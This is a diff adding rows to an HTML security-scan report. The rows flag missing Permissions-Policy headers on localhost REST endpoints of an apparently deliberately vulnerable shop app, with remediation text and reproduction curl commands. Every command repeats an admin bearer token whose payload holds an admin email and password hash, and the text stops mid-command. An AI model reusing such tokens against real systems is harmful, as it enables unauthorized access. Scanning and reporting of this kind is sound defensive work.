+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/continue-code \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/rest/order-history<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/rest/order-history \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/order-history \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/rest/products/search<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  &#x27;http://localhost:3000/rest/products/search?q=&#x27; \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  &#x27;http://localhost:3000/rest/products/search?q=&#x27; \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/rest/products/{id}/reviews<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/rest/products/1/reviews \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/products/1/reviews \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/rest/saveLoginIp<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/rest/saveLoginIp \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/saveLoginIp \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/rest/user/login<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
